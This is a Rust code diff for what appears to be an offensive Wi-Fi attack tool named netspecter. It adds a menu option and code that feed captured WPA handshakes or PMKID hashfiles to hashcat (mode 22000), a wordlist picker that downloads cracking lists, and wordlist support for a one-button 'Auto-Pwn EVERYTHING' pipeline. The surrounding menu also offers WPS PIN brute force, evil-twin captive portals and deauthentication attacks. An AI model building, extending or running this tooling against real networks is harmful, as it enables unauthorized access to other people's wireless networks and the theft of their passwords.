@@ -494,6 +494,7 @@ fn attack_menu(agent: &mut Agent, ap: &AP, iface: &str) {
     options.push(("WPS: online PIN brute (hours)", format!("wps-brute:{}", ap.bssid)));
     options.push(("Evil Twin captive portal (social engineering)", format!("evil-twin:{}", ap.bssid)));
     options.push(("Deauth only (kick clients off)", format!("deauth:{}", ap.bssid)));
+    options.push(("Crack: run wordlists against the captured material", format!("crack:{}", ap.bssid)));
     options.push(("Auto-Pwn EVERYTHING (the one-button pipeline)", "auto-pwn".into()));
 
     for (i, (label, _)) in options.iter().enumerate() {
@@ -687,12 +688,68 @@ fn run_attack(agent: &mut Agent, ap: &AP, iface: &str, action: &str) {
             let _ = agent.call(Request::StopDeauth { bssid: ap.bssid.clone() });
             ok("stopped");
         }
+        "crack" => {
+            header("CRACK");
+            let cap_hint = if ap.handshake {
+                "the captured 4-way handshake"
+            } else {
+                "the PMKID you captured earlier (run the harvest first if you haven't)"
+            };
+            let Some(list) = pick_wordlist(cap_hint) else {
+                return;
+            };
+
+            // The PMKID harvest reported the capture path; ask for it (with a
+            // sensible default guess from the capture dir naming scheme).
+            let default_src = format!(
+                "/var/lib/netspecter/captures/{}_{}.hc22000",
+                ap.bssid.replace(':', ""),
+                ap.essid.replace('/', "_")
+            );
+            let src = prompt(&format!(
+                "capture file (Enter = {default_src}):"
+            ));
+            let src = if src.is_empty() { default_src } else { src };
+            let src_path = std::path::PathBuf::from(&src);
+
+            if !src_path.is_file() {
+                fail(&format!("{src} does not exist — run the PMKID harvest first (it saves the hashfile)"));
+                return;
+            }
+
+            if !netspecter_common::deps::is_installed("hashcat") {
+                warn("hashcat not installed — run: sudo apt install hashcat");
+                return;
+            }
+
+            println!(
+                "{}",
+                ui::dim(&format!("hashcat -m 22000 {list} {src} …"))
+            );
+            let status = std::process::Command::new("hashcat")
+                .arg("-m").arg("22000")
+                .arg(&list)
+                .arg(&src_path)
+                .status();
+            match status {
+                Ok(s) if s.success() => ok("hashcat finished — the cracked password (if any) is printed above"),
+                _ => warn("hashcat exited nonzero — no match in this list, or an unreadable hashfile"),
+            }
+        }
         "auto-pwn" => {
             header("AUTO-PWN EVERYTHING");
             println!("{}", ui::dim("full pipeline: discover → hidden recovery → rank → attack → crack"));
             println!("{}", ui::dim("this runs up to the configured attack budget; watch the output stream."));
+
+            // Wordlist step: suggest the catalog, download the pick once, then
+            // feed it to the pipeline's crack stage.
+            let mut config = netspecter_common::autopwn::AutoPwnConfig::default();
+            if let Some(list) = pick_wordlist("the auto-crack stage") {
+                config.wordlists = vec![list];
+            }
+
             if let Err(e) = agent.call(Request::StartAutoPwn {
-                config: netspecter_common::autopwn::AutoPwnConfig::default(),
+                config,
             }) {
                 fail(&e);
                 return;
@@ -798,6 +855,77 @@ fn print_event(ev: &netspecter_common::autopwn::PipelineEvent) {
         }
         PE::Done { cracked, attempted } => {
             println!("  {} pipeline wrapped: {cracked}/{attempted} cracked", ui::dim("✓"));
+        }
+    }
+}
+
+/// Show the wordlist menu: curated catalog with readiness, download on
+/// first pick, reuse forever after. Returns the chosen list's local path.
+fn pick_wordlist(agent_hint: &str) -> Option<std::path::PathBuf> {
+    use netspecter_common::wordlists::{self, WordlistState};
+
+    let status = wordlists::catalog_status();
+    header("WORDLIST");
+    println!("{}", ui::dim(&format!("suggested for {agent_hint} — small lists first, they hit fast")));
+
+    let ready: Vec<usize> = status
+        .iter()
+        .enumerate()
+        .filter(|(_, w)| matches!(w.state, WordlistState::Ready(_)))
+        .map(|(i, _)| i)
+        .collect();
+
+    for (i, w) in status.iter().enumerate() {
+        let mark = match &w.state {
+            WordlistState::Ready(_) => ui::green("[ready]"),
+            WordlistState::Downloadable => ui::yellow("[download]"),
+        };
+        println!(
+            "  {} {} {} {}",
+            ui::bold(&format!("[{}]", i + 1)),
+            ui::bold(w.entry.label),
+            ui::dim(w.entry.description),
+            mark
+        );
+        if let WordlistState::Ready(p) = &w.state {
+            println!("     {}", ui::dim(p));
+        }
+    }
+    println!("  {}  {}", ui::bold("[s]"), ui::dim("skip cracking for now"));
+
+    loop {
+        let answer = prompt("wordlist:");
+        match answer.as_str() {
+            "s" | "S" | "skip" => return None,
+            _ => {
+                let Ok(n) = answer.parse::<usize>() else {
+                    println!("{}", ui::dim("  pick a number from the menu, or s to skip"));
+                    continue;
+                };
+                if !(1..=status.len()).contains(&n) {
+                    continue;
+                }
+                let w = &status[n - 1];
+                let path = match &w.state {
+                    WordlistState::Ready(p) => std::path::PathBuf::from(p),
+                    WordlistState::Downloadable => {
+                        println!();
+                        match wordlists::ensure_available(w.entry.id, |line| {
+                            println!("  {}", ui::dim(line));
+                        }) {
+                            Ok(p) => {
+                                ok(&format!("{} ready: {}", w.entry.label, p.display()));
+                                p
+                            }
+                            Err(e) => {
+                                fail(&e);
+                                return None;
+                            }
+                        }
+                    }
+                };
+                return Some(path);
+            }
         }
     }
 }
